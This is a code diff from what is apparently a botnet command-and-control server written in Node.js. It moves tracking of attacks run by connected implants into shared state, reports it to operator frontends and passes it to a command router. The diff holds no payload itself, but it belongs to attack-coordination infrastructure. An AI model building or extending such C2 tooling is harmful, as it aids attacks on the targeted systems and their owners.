@@ -16,12 +16,12 @@ import jwt from 'jsonwebtoken';
 
 
 
-const webSocketsServer = async (httpServer) => {
+const webSocketsServer = async (httpServer, attacks_running) => {
   try {
     const server = new WebSocketServer({ server: httpServer });
     const agents = new Map();   // Mapa de agents conectados (por ID)
     const users = new Set();  // Set de users conectados (frontends)
-    let attacks = [];
+    
 
     server.on('connection', (socket, request) => {
       const url = new URL(request.url, `http://${request.headers.host}`);
@@ -68,28 +68,28 @@ const webSocketsServer = async (httpServer) => {
       agents.set(clientId, socket);
       socket.isAlive = true;
 
-      //Datos proveniente de implantes
+      //------------------------Datos proveniente de implantes-------------------------
       socket.on('message', (data) => {
           const data_parsed = JSON.parse(data);
           
           if(!data_parsed.error) {
-              console.log(data_parsed);
-
-              if(data_parsed.status === 'attack_completed') {
-                  // Filtrar para REMOVER el ataque completado
-                  attacks = attacks.filter(a => 
+            
+            if(data_parsed.status === 'attack_completed') {
+              // Filtrar para REMOVER el ataque completado
+              // Si el mensaje del implante falla, el controller limpia el estado de running_attacks en el backend
+               attacks_running.attacks = attacks_running.attacks.filter(a => 
                       a.attack_type !== data_parsed.attack_type || 
                       a.target !== data_parsed.target
-                  );
-              } else if(data_parsed.status === 'attack_started') {
-                  // Solo agregar si es un nuevo ataque
-                  const exists = attacks.some(a => 
+                    ); 
+                  } else if(data_parsed.status === 'attack_running') {
+                    // Solo agregar si es un nuevo ataque
+                  const exists = attacks_running.attacks.some(a => 
                       a.attack_type === data_parsed.attack_type && 
                       a.target === data_parsed.target
                   );
                   
                   if(!exists) {
-                      attacks.push(data_parsed);
+                      attacks_running.attacks.push(data_parsed);
                   }
               }
           }
@@ -128,7 +128,7 @@ const webSocketsServer = async (httpServer) => {
       // Enviar estados a todos los users conectados
       const payload = {
         data: status_connections,
-        botnet: attacks
+        botnet: attacks_running.attacks
       };
 
       
@@ -143,7 +143,7 @@ const webSocketsServer = async (httpServer) => {
     server.on("close", () => clearInterval(interval));
 
 
-    return { agents, users };
+    return { agents };
 
   } catch (error) {
     console.error('Error en WebSocket server:', error);
@@ -160,15 +160,17 @@ const main = async () =>{
     app.use(cors());
     
     app.use(helmet())
+
+    let attacks_running={attacks:[]};
     
     app.use(express.json())
     app.use(express.urlencoded({ extended: true })); // Para formularios HTML
     app.use(express.static('public/arts/'));
     const server = http.createServer(app);
-    const {agents} = await webSocketsServer(server)
+    const {agents} = await webSocketsServer(server, attacks_running)
     
     app.use('/api/auth', authRouter)
-    app.use('/api/rcv', cmd_router(agents))
+    app.use('/api/rcv', cmd_router(agents, attacks_running))
     app.use('/api/impl', implant_router())
     //------Type errors-----
     app.use(type_errors);
